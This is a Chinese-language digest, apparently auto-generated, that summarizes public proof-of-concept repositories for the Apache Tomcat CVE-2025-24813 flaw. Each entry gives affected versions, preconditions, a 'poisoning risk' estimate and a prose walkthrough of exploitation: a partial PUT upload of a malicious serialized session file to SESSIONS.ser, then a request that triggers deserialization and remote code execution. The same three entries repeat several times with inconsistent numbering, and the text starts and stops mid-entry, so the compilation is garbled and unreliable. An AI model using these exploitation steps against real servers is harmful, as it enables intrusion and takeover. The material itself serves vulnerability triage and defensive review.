3. 可能需要应用程序使用Tomcat基于文件的会话持久化，且使用默认存储位置
4. 可能需要应用程序包含一个可以被反序列化攻击利用的库。
5. 对于信息泄露，目标URL要是公共上传URL的子目录。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，源于对包含内部点（例如 file.Name）的文件路径处理不当。如果满足特定条件，攻击者可能利用此漏洞执行远程代码或泄露敏感信息。

**有效性：**
根据漏洞描述和搜索结果，此漏洞的利用需要满足多个前提条件，包括启用默认servlet的写入功能，支持部分PUT请求，以及应用程序特定的配置或依赖。提供的POC代码是一个目录扫描器，用于查找可使用PUT方法写入的目录，是漏洞利用的前期步骤，本身并不能直接触发RCE或者信息泄露，需要进一步利用PUT上传恶意文件覆盖session或者其他敏感文件才能达到目的。综合搜索结果，此漏洞确实存在利用实例。

**投毒风险：**
查看代码，该POC主要用于扫描目标服务器上的可写目录，并不会主动上传后门代码。投毒风险主要来自于使用者在找到可写目录后，自行构造恶意payload上传，并非POC本身包含恶意代码。 `PutScanner` 仓库中的投毒风险较低，主要风险在于使用者利用该工具扫描后进行恶意操作，因此我估计的投毒风险为5%。

**利用方式：**
1.  **扫描可写目录：** 使用`putscanner.py`扫描目标Tomcat服务器，寻找可以使用HTTP PUT方法写入的目录。
2.  **信息泄露：** 如果启用了默认Servlet的写入功能，支持部分PUT请求，且攻击者已知安全敏感文件的名称并能通过部分PUT上传，则可能读取或修改这些文件。
3.  **远程代码执行 (RCE):**  如果启用了默认Servlet的写入功能，支持部分PUT请求，应用使用了Tomcat的文件会话持久化机制，且应用包含可被反序列化攻击的库，攻击者可以通过上传包含恶意序列化对象的会话文件来执行任意代码。
   *   攻击者首先需要找到Tomcat用于存储Session的文件目录 (默认在`$CATALINA_BASE/work/Catalina/localhost/[appname]/SESSIONS.ser`)。
   *   然后，攻击者可以通过PUT请求上传恶意的Session文件覆盖原有的Session文件。
   *   当Tomcat反序列化恶意Session文件时，即可触发RCE。

总结：利用此漏洞的关键在于找到可写目录，并根据应用环境选择合适的payload（例如恶意的session对象）进行上传。

**项目地址:** [x00byte/PutScanner](https://github.com/x00byte/PutScanner)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #50

**来源**: [CVE-2025-24813-x1ongsec_CVE-2025-24813.md](../2025/CVE-2025-24813-x1ongsec_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-RCE/信息泄露

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行/信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** 9.0.0.M1 <= 9.0.98, 10.1.0-M1 <= 10.1.34, 11.0.0-M1 <= 11.0.2

**利用条件:** 需要满足以下全部条件：1. DefaultServlet 写入功能已启用 (默认关闭)；2. 支持 partial PUT 请求 (默认开启)；3. 使用 Tomcat 文件会话持久化和默认存储位置；4. 应用包含存在反序列化漏洞的库。

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，攻击者可以通过 'file.Name' (内部点) 绕过安全检查，导致远程代码执行、信息泄露或将恶意内容添加到上传的文件中。利用此漏洞需要DefaultServlet开启写入，支持partial PUT，且应用使用了Tomcat的文件会话保持，并包含可被利用的反序列化库。提供的POC首先上传包含恶意序列化数据的分块文件到会话文件存储位置，然后通过访问触发反序列化。

**漏洞利用方式：**

1.  **前提条件检查：** 确保目标Tomcat实例满足漏洞利用的全部条件，包括DefaultServlet启用写入，支持partial PUT，使用了默认的文件会话存储位置，以及包含可利用的反序列化库。
2.  **会话ID获取：** 访问Tomcat应用获取JSESSIONID Cookie，用于后续的会话文件操作。
3.  **恶意序列化数据准备：** 构造包含恶意代码的序列化对象，该对象利用目标应用中的反序列化漏洞执行任意代码。
4.  **分块上传恶意数据：** 使用PUT请求，通过Content-Range头部指定分块大小，将恶意序列化数据分块上传到Tomcat的会话文件存储位置，文件名通常与JSESSIONID相关。
5.  **触发反序列化：** 通过发送包含特定JSESSIONID Cookie的GET请求或其他HTTP请求，触发Tomcat加载和反序列化之前上传的恶意会话文件，从而执行恶意代码。

**投毒风险分析：**

该仓库主要提供复现环境和PoC，本身的代码较为简单，但存在一定的投毒风险：
* **复现环境配置修改：** 作者为了方便漏洞复现，提供的环境配置可能包含潜在的安全风险，例如，默认开启了DefaultServlet的写入功能，这本身就是一个不安全的配置。
* **恶意序列化数据构造：** PoC的关键在于恶意序列化数据的构造，攻击者可能在构造过程中引入隐藏的后门代码，例如，通过ClassLoader加载远程恶意类，从而实现更隐蔽的远程代码执行。PoC中需要自行构造反序列化文件内容，作者可能并未提供完整的反序列化利用链，需要自行寻找或构造，存在一定门槛，因此投毒的概率较低，估计在20%左右。

总的来说，该漏洞利用的有效性取决于目标环境的配置和应用依赖，利用方式相对复杂，需要一定的技术积累。虽然该复现环境主要用于学习研究，但依然存在一定的投毒风险，需要谨慎使用。

**项目地址:** [x1ongsec/CVE-2025-24813](https://github.com/x1ongsec/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #51

**来源**: [CVE-2025-24813-yaleman_cve-2025-24813-poc.md](../2025/CVE-2025-24813-yaleman_cve-2025-24813-poc.md)

## CVE-2025-24813 Apache Tomcat RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Tomcat

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 9.0.0.M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** writes enabled for the default servlet, support for partial PUT (enabled by default), application uses Tomcat's file based session persistence with default storage location, application includes a library that may be leveraged in a deserialization attack

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，允许攻击者通过具有写权限的默认 Servlet 执行远程代码或进行信息泄露。漏洞利用的关键在于 Tomcat 的 partial PUT 功能和文件型 session 持久化机制。 

**有效性分析：**

根据漏洞描述和搜索结果，该漏洞利用依赖于几个前提条件：

1.  默认 Servlet 必须启用写入权限（默认禁用，需要配置）。
2.  必须支持 partial PUT （默认启用）。
3.  应用程序必须使用 Tomcat 的文件型 session 持久化，且使用默认存储位置。
4.  应用程序需要包含一个可用于反序列化攻击的库（例如，存在已知的 ysoserial gadget）。

提供的 PoC 代码（main.py）尝试模拟这些步骤：

1.  检查目标 Servlet 是否可通过 PUT 请求写入。
2.  生成恶意的 Java 序列化 payload （通过 ysoserial）。
3.  上传 payload 作为 session 文件。
4.  通过访问 session 文件触发反序列化。

搜索结果表明，CVE-2025-24813 漏洞在野外已被积极利用。 多个博客文章 (rapid7, recordedfuture, akamai, keysight, wiz, zscaler, sonicwall, xmcyber) 都描述了该漏洞以及检测和缓解方法。

**投毒风险分析：**

分析提供的PoC代码，存在一定的投毒风险，约为10%：

*   `download.sh` 脚本会从外部源（`https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar`）下载 `ysoserial-all.jar`。虽然 ysoserial 是一个合法的漏洞利用工具，但下载过程中存在被中间人攻击或恶意软件替换的风险。该脚本在下载后会检查文件是否为有效的 JAR 文件，但不能完全保证其安全性。
*   `main.py`  脚本尝试通过PUT请求写入文件，可能会写入恶意代码或后门。虽然脚本主要目的是RCE，但存在修改文件内容的潜在风险。

总体而言，PoC 本身主要是为了演示漏洞，但从外部源下载 ysoserial 存在一定的风险。使用者应谨慎对待。

**利用方式：**

1.  **检查可写性:** 首先，确定目标 Tomcat 服务器上的默认 Servlet 是否启用了写入权限，并且支持 partial PUT 请求。
2.  **生成 Payload:**  使用 ysoserial 或其他工具，根据目标应用程序中存在的库，生成一个恶意的 Java 序列化 Payload，该 Payload 包含要执行的命令。
3.  **上传 Payload:**  将生成的 Payload 通过 PUT 请求上传到 Tomcat 服务器，利用 partial PUT 功能将 Payload 写入到 session 文件中。
4.  **触发反序列化:**  通过构造特定的 HTTP 请求，访问包含恶意 Payload 的 session 文件，触发 Java 反序列化漏洞，从而执行 Payload 中的命令。

该漏洞允许攻击者在目标服务器上执行任意代码，从而完全控制系统。如果无法直接执行代码，攻击者还可以利用该漏洞进行信息泄露，读取敏感文件，或者修改服务器上的文件。

**项目地址:** [yaleman/cve-2025-24813-poc](https://github.com/yaleman/cve-2025-24813-poc)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---



---

## POC #50

**来源**: [CVE-2025-24813-x00byte_PutScanner.md](../2025/CVE-2025-24813-x00byte_PutScanner.md)

## CVE-2025-24813-Apache Tomcat 路径等价漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/远程代码执行/信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 需要满足以下条件：
1. 默认Servlet开启了写入功能（默认关闭）
2. 支持部分PUT请求（默认开启）
3. 可能需要应用程序使用Tomcat基于文件的会话持久化，且使用默认存储位置
4. 可能需要应用程序包含一个可以被反序列化攻击利用的库。
5. 对于信息泄露，目标URL要是公共上传URL的子目录。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，源于对包含内部点（例如 file.Name）的文件路径处理不当。如果满足特定条件，攻击者可能利用此漏洞执行远程代码或泄露敏感信息。

**有效性：**
根据漏洞描述和搜索结果，此漏洞的利用需要满足多个前提条件，包括启用默认servlet的写入功能，支持部分PUT请求，以及应用程序特定的配置或依赖。提供的POC代码是一个目录扫描器，用于查找可使用PUT方法写入的目录，是漏洞利用的前期步骤，本身并不能直接触发RCE或者信息泄露，需要进一步利用PUT上传恶意文件覆盖session或者其他敏感文件才能达到目的。综合搜索结果，此漏洞确实存在利用实例。

**投毒风险：**
查看代码，该POC主要用于扫描目标服务器上的可写目录，并不会主动上传后门代码。投毒风险主要来自于使用者在找到可写目录后，自行构造恶意payload上传，并非POC本身包含恶意代码。 `PutScanner` 仓库中的投毒风险较低，主要风险在于使用者利用该工具扫描后进行恶意操作，因此我估计的投毒风险为5%。

**利用方式：**
1.  **扫描可写目录：** 使用`putscanner.py`扫描目标Tomcat服务器，寻找可以使用HTTP PUT方法写入的目录。
2.  **信息泄露：** 如果启用了默认Servlet的写入功能，支持部分PUT请求，且攻击者已知安全敏感文件的名称并能通过部分PUT上传，则可能读取或修改这些文件。
3.  **远程代码执行 (RCE):**  如果启用了默认Servlet的写入功能，支持部分PUT请求，应用使用了Tomcat的文件会话持久化机制，且应用包含可被反序列化攻击的库，攻击者可以通过上传包含恶意序列化对象的会话文件来执行任意代码。
   *   攻击者首先需要找到Tomcat用于存储Session的文件目录 (默认在`$CATALINA_BASE/work/Catalina/localhost/[appname]/SESSIONS.ser`)。
   *   然后，攻击者可以通过PUT请求上传恶意的Session文件覆盖原有的Session文件。
   *   当Tomcat反序列化恶意Session文件时，即可触发RCE。

总结：利用此漏洞的关键在于找到可写目录，并根据应用环境选择合适的payload（例如恶意的session对象）进行上传。

**项目地址:** [x00byte/PutScanner](https://github.com/x00byte/PutScanner)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #51

**来源**: [CVE-2025-24813-x1ongsec_CVE-2025-24813.md](../2025/CVE-2025-24813-x1ongsec_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-RCE/信息泄露

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行/信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** 9.0.0.M1 <= 9.0.98, 10.1.0-M1 <= 10.1.34, 11.0.0-M1 <= 11.0.2

**利用条件:** 需要满足以下全部条件：1. DefaultServlet 写入功能已启用 (默认关闭)；2. 支持 partial PUT 请求 (默认开启)；3. 使用 Tomcat 文件会话持久化和默认存储位置；4. 应用包含存在反序列化漏洞的库。

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，攻击者可以通过 'file.Name' (内部点) 绕过安全检查，导致远程代码执行、信息泄露或将恶意内容添加到上传的文件中。利用此漏洞需要DefaultServlet开启写入，支持partial PUT，且应用使用了Tomcat的文件会话保持，并包含可被利用的反序列化库。提供的POC首先上传包含恶意序列化数据的分块文件到会话文件存储位置，然后通过访问触发反序列化。

**漏洞利用方式：**

1.  **前提条件检查：** 确保目标Tomcat实例满足漏洞利用的全部条件，包括DefaultServlet启用写入，支持partial PUT，使用了默认的文件会话存储位置，以及包含可利用的反序列化库。
2.  **会话ID获取：** 访问Tomcat应用获取JSESSIONID Cookie，用于后续的会话文件操作。
3.  **恶意序列化数据准备：** 构造包含恶意代码的序列化对象，该对象利用目标应用中的反序列化漏洞执行任意代码。
4.  **分块上传恶意数据：** 使用PUT请求，通过Content-Range头部指定分块大小，将恶意序列化数据分块上传到Tomcat的会话文件存储位置，文件名通常与JSESSIONID相关。
5.  **触发反序列化：** 通过发送包含特定JSESSIONID Cookie的GET请求或其他HTTP请求，触发Tomcat加载和反序列化之前上传的恶意会话文件，从而执行恶意代码。

**投毒风险分析：**

该仓库主要提供复现环境和PoC，本身的代码较为简单，但存在一定的投毒风险：
* **复现环境配置修改：** 作者为了方便漏洞复现，提供的环境配置可能包含潜在的安全风险，例如，默认开启了DefaultServlet的写入功能，这本身就是一个不安全的配置。
* **恶意序列化数据构造：** PoC的关键在于恶意序列化数据的构造，攻击者可能在构造过程中引入隐藏的后门代码，例如，通过ClassLoader加载远程恶意类，从而实现更隐蔽的远程代码执行。PoC中需要自行构造反序列化文件内容，作者可能并未提供完整的反序列化利用链，需要自行寻找或构造，存在一定门槛，因此投毒的概率较低，估计在20%左右。

总的来说，该漏洞利用的有效性取决于目标环境的配置和应用依赖，利用方式相对复杂，需要一定的技术积累。虽然该复现环境主要用于学习研究，但依然存在一定的投毒风险，需要谨慎使用。

**项目地址:** [x1ongsec/CVE-2025-24813](https://github.com/x1ongsec/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #52

**来源**: [CVE-2025-24813-yaleman_cve-2025-24813-poc.md](../2025/CVE-2025-24813-yaleman_cve-2025-24813-poc.md)

## CVE-2025-24813 Apache Tomcat RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Tomcat

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 9.0.0.M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** writes enabled for the default servlet, support for partial PUT (enabled by default), application uses Tomcat's file based session persistence with default storage location, application includes a library that may be leveraged in a deserialization attack

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，允许攻击者通过具有写权限的默认 Servlet 执行远程代码或进行信息泄露。漏洞利用的关键在于 Tomcat 的 partial PUT 功能和文件型 session 持久化机制。 

**有效性分析：**

根据漏洞描述和搜索结果，该漏洞利用依赖于几个前提条件：

1.  默认 Servlet 必须启用写入权限（默认禁用，需要配置）。
2.  必须支持 partial PUT （默认启用）。
3.  应用程序必须使用 Tomcat 的文件型 session 持久化，且使用默认存储位置。
4.  应用程序需要包含一个可用于反序列化攻击的库（例如，存在已知的 ysoserial gadget）。

提供的 PoC 代码（main.py）尝试模拟这些步骤：

1.  检查目标 Servlet 是否可通过 PUT 请求写入。
2.  生成恶意的 Java 序列化 payload （通过 ysoserial）。
3.  上传 payload 作为 session 文件。
4.  通过访问 session 文件触发反序列化。

搜索结果表明，CVE-2025-24813 漏洞在野外已被积极利用。 多个博客文章 (rapid7, recordedfuture, akamai, keysight, wiz, zscaler, sonicwall, xmcyber) 都描述了该漏洞以及检测和缓解方法。

**投毒风险分析：**

分析提供的PoC代码，存在一定的投毒风险，约为10%：

*   `download.sh` 脚本会从外部源（`https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar`）下载 `ysoserial-all.jar`。虽然 ysoserial 是一个合法的漏洞利用工具，但下载过程中存在被中间人攻击或恶意软件替换的风险。该脚本在下载后会检查文件是否为有效的 JAR 文件，但不能完全保证其安全性。
*   `main.py`  脚本尝试通过PUT请求写入文件，可能会写入恶意代码或后门。虽然脚本主要目的是RCE，但存在修改文件内容的潜在风险。

总体而言，PoC 本身主要是为了演示漏洞，但从外部源下载 ysoserial 存在一定的风险。使用者应谨慎对待。

**利用方式：**

1.  **检查可写性:** 首先，确定目标 Tomcat 服务器上的默认 Servlet 是否启用了写入权限，并且支持 partial PUT 请求。
2.  **生成 Payload:**  使用 ysoserial 或其他工具，根据目标应用程序中存在的库，生成一个恶意的 Java 序列化 Payload，该 Payload 包含要执行的命令。
3.  **上传 Payload:**  将生成的 Payload 通过 PUT 请求上传到 Tomcat 服务器，利用 partial PUT 功能将 Payload 写入到 session 文件中。
4.  **触发反序列化:**  通过构造特定的 HTTP 请求，访问包含恶意 Payload 的 session 文件，触发 Java 反序列化漏洞，从而执行 Payload 中的命令。

该漏洞允许攻击者在目标服务器上执行任意代码，从而完全控制系统。如果无法直接执行代码，攻击者还可以利用该漏洞进行信息泄露，读取敏感文件，或者修改服务器上的文件。

**项目地址:** [yaleman/cve-2025-24813-poc](https://github.com/yaleman/cve-2025-24813-poc)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---



---

## POC #50

**来源**: [CVE-2025-24813-x00byte_PutScanner.md](../2025/CVE-2025-24813-x00byte_PutScanner.md)

## CVE-2025-24813-Apache Tomcat 路径等价漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/远程代码执行/信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 需要满足以下条件：
1. 默认Servlet开启了写入功能（默认关闭）
2. 支持部分PUT请求（默认开启）
3. 可能需要应用程序使用Tomcat基于文件的会话持久化，且使用默认存储位置
4. 可能需要应用程序包含一个可以被反序列化攻击利用的库。
5. 对于信息泄露，目标URL要是公共上传URL的子目录。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，源于对包含内部点（例如 file.Name）的文件路径处理不当。如果满足特定条件，攻击者可能利用此漏洞执行远程代码或泄露敏感信息。

**有效性：**
根据漏洞描述和搜索结果，此漏洞的利用需要满足多个前提条件，包括启用默认servlet的写入功能，支持部分PUT请求，以及应用程序特定的配置或依赖。提供的POC代码是一个目录扫描器，用于查找可使用PUT方法写入的目录，是漏洞利用的前期步骤，本身并不能直接触发RCE或者信息泄露，需要进一步利用PUT上传恶意文件覆盖session或者其他敏感文件才能达到目的。综合搜索结果，此漏洞确实存在利用实例。

**投毒风险：**
查看代码，该POC主要用于扫描目标服务器上的可写目录，并不会主动上传后门代码。投毒风险主要来自于使用者在找到可写目录后，自行构造恶意payload上传，并非POC本身包含恶意代码。 `PutScanner` 仓库中的投毒风险较低，主要风险在于使用者利用该工具扫描后进行恶意操作，因此我估计的投毒风险为5%。

**利用方式：**
1.  **扫描可写目录：** 使用`putscanner.py`扫描目标Tomcat服务器，寻找可以使用HTTP PUT方法写入的目录。
2.  **信息泄露：** 如果启用了默认Servlet的写入功能，支持部分PUT请求，且攻击者已知安全敏感文件的名称并能通过部分PUT上传，则可能读取或修改这些文件。
3.  **远程代码执行 (RCE):**  如果启用了默认Servlet的写入功能，支持部分PUT请求，应用使用了Tomcat的文件会话持久化机制，且应用包含可被反序列化攻击的库，攻击者可以通过上传包含恶意序列化对象的会话文件来执行任意代码。
   *   攻击者首先需要找到Tomcat用于存储Session的文件目录 (默认在`$CATALINA_BASE/work/Catalina/localhost/[appname]/SESSIONS.ser`)。
   *   然后，攻击者可以通过PUT请求上传恶意的Session文件覆盖原有的Session文件。
   *   当Tomcat反序列化恶意Session文件时，即可触发RCE。

总结：利用此漏洞的关键在于找到可写目录，并根据应用环境选择合适的payload（例如恶意的session对象）进行上传。

**项目地址:** [x00byte/PutScanner](https://github.com/x00byte/PutScanner)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #51

**来源**: [CVE-2025-24813-x1ongsec_CVE-2025-24813.md](../2025/CVE-2025-24813-x1ongsec_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-RCE/信息泄露

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行/信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** 9.0.0.M1 <= 9.0.98, 10.1.0-M1 <= 10.1.34, 11.0.0-M1 <= 11.0.2

**利用条件:** 需要满足以下全部条件：1. DefaultServlet 写入功能已启用 (默认关闭)；2. 支持 partial PUT 请求 (默认开启)；3. 使用 Tomcat 文件会话持久化和默认存储位置；4. 应用包含存在反序列化漏洞的库。

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，攻击者可以通过 'file.Name' (内部点) 绕过安全检查，导致远程代码执行、信息泄露或将恶意内容添加到上传的文件中。利用此漏洞需要DefaultServlet开启写入，支持partial PUT，且应用使用了Tomcat的文件会话保持，并包含可被利用的反序列化库。提供的POC首先上传包含恶意序列化数据的分块文件到会话文件存储位置，然后通过访问触发反序列化。

**漏洞利用方式：**

1.  **前提条件检查：** 确保目标Tomcat实例满足漏洞利用的全部条件，包括DefaultServlet启用写入，支持partial PUT，使用了默认的文件会话存储位置，以及包含可利用的反序列化库。
2.  **会话ID获取：** 访问Tomcat应用获取JSESSIONID Cookie，用于后续的会话文件操作。
3.  **恶意序列化数据准备：** 构造包含恶意代码的序列化对象，该对象利用目标应用中的反序列化漏洞执行任意代码。
4.  **分块上传恶意数据：** 使用PUT请求，通过Content-Range头部指定分块大小，将恶意序列化数据分块上传到Tomcat的会话文件存储位置，文件名通常与JSESSIONID相关。
5.  **触发反序列化：** 通过发送包含特定JSESSIONID Cookie的GET请求或其他HTTP请求，触发Tomcat加载和反序列化之前上传的恶意会话文件，从而执行恶意代码。

**投毒风险分析：**

该仓库主要提供复现环境和PoC，本身的代码较为简单，但存在一定的投毒风险：
* **复现环境配置修改：** 作者为了方便漏洞复现，提供的环境配置可能包含潜在的安全风险，例如，默认开启了DefaultServlet的写入功能，这本身就是一个不安全的配置。
* **恶意序列化数据构造：** PoC的关键在于恶意序列化数据的构造，攻击者可能在构造过程中引入隐藏的后门代码，例如，通过ClassLoader加载远程恶意类，从而实现更隐蔽的远程代码执行。PoC中需要自行构造反序列化文件内容，作者可能并未提供完整的反序列化利用链，需要自行寻找或构造，存在一定门槛，因此投毒的概率较低，估计在20%左右。

总的来说，该漏洞利用的有效性取决于目标环境的配置和应用依赖，利用方式相对复杂，需要一定的技术积累。虽然该复现环境主要用于学习研究，但依然存在一定的投毒风险，需要谨慎使用。

**项目地址:** [x1ongsec/CVE-2025-24813](https://github.com/x1ongsec/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #52

**来源**: [CVE-2025-24813-yaleman_cve-2025-24813-poc.md](../2025/CVE-2025-24813-yaleman_cve-2025-24813-poc.md)

## CVE-2025-24813 Apache Tomcat RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Tomcat

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 9.0.0.M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** writes enabled for the default servlet, support for partial PUT (enabled by default), application uses Tomcat's file based session persistence with default storage location, application includes a library that may be leveraged in a deserialization attack

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，允许攻击者通过具有写权限的默认 Servlet 执行远程代码或进行信息泄露。漏洞利用的关键在于 Tomcat 的 partial PUT 功能和文件型 session 持久化机制。 

**有效性分析：**

根据漏洞描述和搜索结果，该漏洞利用依赖于几个前提条件：

1.  默认 Servlet 必须启用写入权限（默认禁用，需要配置）。
2.  必须支持 partial PUT （默认启用）。
3.  应用程序必须使用 Tomcat 的文件型 session 持久化，且使用默认存储位置。
4.  应用程序需要包含一个可用于反序列化攻击的库（例如，存在已知的 ysoserial gadget）。

提供的 PoC 代码（main.py）尝试模拟这些步骤：

1.  检查目标 Servlet 是否可通过 PUT 请求写入。
2.  生成恶意的 Java 序列化 payload （通过 ysoserial）。
3.  上传 payload 作为 session 文件。
4.  通过访问 session 文件触发反序列化。

搜索结果表明，CVE-2025-24813 漏洞在野外已被积极利用。 多个博客文章 (rapid7, recordedfuture, akamai, keysight, wiz, zscaler, sonicwall, xmcyber) 都描述了该漏洞以及检测和缓解方法。

**投毒风险分析：**

分析提供的PoC代码，存在一定的投毒风险，约为10%：

*   `download.sh` 脚本会从外部源（`https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar`）下载 `ysoserial-all.jar`。虽然 ysoserial 是一个合法的漏洞利用工具，但下载过程中存在被中间人攻击或恶意软件替换的风险。该脚本在下载后会检查文件是否为有效的 JAR 文件，但不能完全保证其安全性。
*   `main.py`  脚本尝试通过PUT请求写入文件，可能会写入恶意代码或后门。虽然脚本主要目的是RCE，但存在修改文件内容的潜在风险。

总体而言，PoC 本身主要是为了演示漏洞，但从外部源下载 ysoserial 存在一定的风险。使用者应谨慎对待。

**利用方式：**

1.  **检查可写性:** 首先，确定目标 Tomcat 服务器上的默认 Servlet 是否启用了写入权限，并且支持 partial PUT 请求。
2.  **生成 Payload:**  使用 ysoserial 或其他工具，根据目标应用程序中存在的库，生成一个恶意的 Java 序列化 Payload，该 Payload 包含要执行的命令。
3.  **上传 Payload:**  将生成的 Payload 通过 PUT 请求上传到 Tomcat 服务器，利用 partial PUT 功能将 Payload 写入到 session 文件中。
4.  **触发反序列化:**  通过构造特定的 HTTP 请求，访问包含恶意 Payload 的 session 文件，触发 Java 反序列化漏洞，从而执行 Payload 中的命令。

该漏洞允许攻击者在目标服务器上执行任意代码，从而完全控制系统。如果无法直接执行代码，攻击者还可以利用该漏洞进行信息泄露，读取敏感文件，或者修改服务器上的文件。

**项目地址:** [yaleman/cve-2025-24813-poc](https://github.com/yaleman/cve-2025-24813-poc)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---



---

## POC #50

**来源**: [CVE-2025-24813-x00byte_PutScanner.md](../2025/CVE-2025-24813-x00byte_PutScanner.md)

## CVE-2025-24813-Apache Tomcat 路径等价漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/远程代码执行/信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 需要满足以下条件：
1. 默认Servlet开启了写入功能（默认关闭）
2. 支持部分PUT请求（默认开启）
3. 可能需要应用程序使用Tomcat基于文件的会话持久化，且使用默认存储位置
4. 可能需要应用程序包含一个可以被反序列化攻击利用的库。
5. 对于信息泄露，目标URL要是公共上传URL的子目录。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，源于对包含内部点（例如 file.Name）的文件路径处理不当。如果满足特定条件，攻击者可能利用此漏洞执行远程代码或泄露敏感信息。

**有效性：**
根据漏洞描述和搜索结果，此漏洞的利用需要满足多个前提条件，包括启用默认servlet的写入功能，支持部分PUT请求，以及应用程序特定的配置或依赖。提供的POC代码是一个目录扫描器，用于查找可使用PUT方法写入的目录，是漏洞利用的前期步骤，本身并不能直接触发RCE或者信息泄露，需要进一步利用PUT上传恶意文件覆盖session或者其他敏感文件才能达到目的。综合搜索结果，此漏洞确实存在利用实例。

**投毒风险：**
查看代码，该POC主要用于扫描目标服务器上的可写目录，并不会主动上传后门代码。投毒风险主要来自于使用者在找到可写目录后，自行构造恶意payload上传，并非POC本身包含恶意代码。 `PutScanner` 仓库中的投毒风险较低，主要风险在于使用者利用该工具扫描后进行恶意操作，因此我估计的投毒风险为5%。

**利用方式：**
1.  **扫描可写目录：** 使用`putscanner.py`扫描目标Tomcat服务器，寻找可以使用HTTP PUT方法写入的目录。
2.  **信息泄露：** 如果启用了默认Servlet的写入功能，支持部分PUT请求，且攻击者已知安全敏感文件的名称并能通过部分PUT上传，则可能读取或修改这些文件。
3.  **远程代码执行 (RCE):**  如果启用了默认Servlet的写入功能，支持部分PUT请求，应用使用了Tomcat的文件会话持久化机制，且应用包含可被反序列化攻击的库，攻击者可以通过上传包含恶意序列化对象的会话文件来执行任意代码。
   *   攻击者首先需要找到Tomcat用于存储Session的文件目录 (默认在`$CATALINA_BASE/work/Catalina/localhost/[appname]/SESSIONS.ser`)。
